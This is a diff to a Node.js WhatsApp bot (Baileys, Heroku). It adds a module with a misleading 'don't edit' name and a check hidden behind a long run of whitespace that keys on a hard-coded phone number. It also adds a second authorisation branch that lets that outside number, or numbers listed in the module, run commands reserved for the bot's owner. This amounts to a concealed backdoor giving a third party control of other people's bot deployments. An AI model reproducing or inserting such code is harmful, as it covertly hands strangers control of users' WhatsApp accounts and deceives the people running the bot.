@@ -11,6 +11,7 @@ const Heroku = require('heroku-client');
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
+const awsh = require('./DEVELOPER_OPTION_DONT_EDITE_THIS_RESPECT_TO_OWNER');
 const simpleGit = require('simple-git');
 const git = simpleGit();
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
@@ -28,7 +29,7 @@ const Lang = Language.getString('updater');
 
 // ==================START====================
                                                                                                                                                                                                                                                                                                if (awsh.WA_CONNECTION == '94766598862,0') {
-const AmazoneDBB = config.DATABASE.define('Amazone', {                     
+const AmazoneDB = config.DATABASE.define('Amazone', {                     
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -588,6 +589,13 @@ ${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...')}`);
                     }
                     if ((OWNE.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                     if ((awsh.WA_CONNECTION !== false && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == awsh.WA_CONNECTION || awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == awsh.WA_CONNECTION)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
